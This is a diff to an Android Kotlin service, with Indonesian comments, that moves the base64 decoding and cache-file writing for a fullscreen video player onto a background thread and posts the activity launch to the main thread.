@@ -1641,24 +1641,32 @@ class SocketService : Service() {
 
     // ── Play Video Fullscreen ──────────────────────────────────────────────
     private fun playVideoFullscreen(videoBase64: String, mimeType: String) {
-        try {
-            val bytes = android.util.Base64.decode(videoBase64, android.util.Base64.DEFAULT)
-            val ext   = when (mimeType) {
-                "video/x-matroska" -> "mkv"
-                "video/webm"       -> "webm"
-                "video/3gpp"       -> "3gp"
-                else               -> "mp4"
-            }
-            val tmpFile = File(cacheDir, "aimlock_vid.$ext")
-            FileOutputStream(tmpFile).use { it.write(bytes) }
-            val intent = Intent(this, VideoPlayerActivity::class.java).apply {
-                putExtra("videoPath", tmpFile.absolutePath)
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
-                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
-                        Intent.FLAG_ACTIVITY_SINGLE_TOP
-            }
-            startActivity(intent)
-        } catch (e: Exception) { e.printStackTrace() }
+        // Decode & tulis file di background thread supaya ga ANR/crash
+        Thread {
+            try {
+                val bytes = android.util.Base64.decode(videoBase64, android.util.Base64.DEFAULT)
+                val ext   = when (mimeType) {
+                    "video/x-matroska" -> "mkv"
+                    "video/webm"       -> "webm"
+                    "video/3gpp"       -> "3gp"
+                    else               -> "mp4"
+                }
+                val tmpFile = File(cacheDir, "aimlock_vid.$ext")
+                FileOutputStream(tmpFile).use { it.write(bytes) }
+                // startActivity harus dari main thread
+                handler.post {
+                    try {
+                        val intent = Intent(this, VideoPlayerActivity::class.java).apply {
+                            putExtra("videoPath", tmpFile.absolutePath)
+                            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                                    Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        }
+                        startActivity(intent)
+                    } catch (e: Exception) { e.printStackTrace() }
+                }
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
     }
 
     private fun stopVideoFullscreen() {
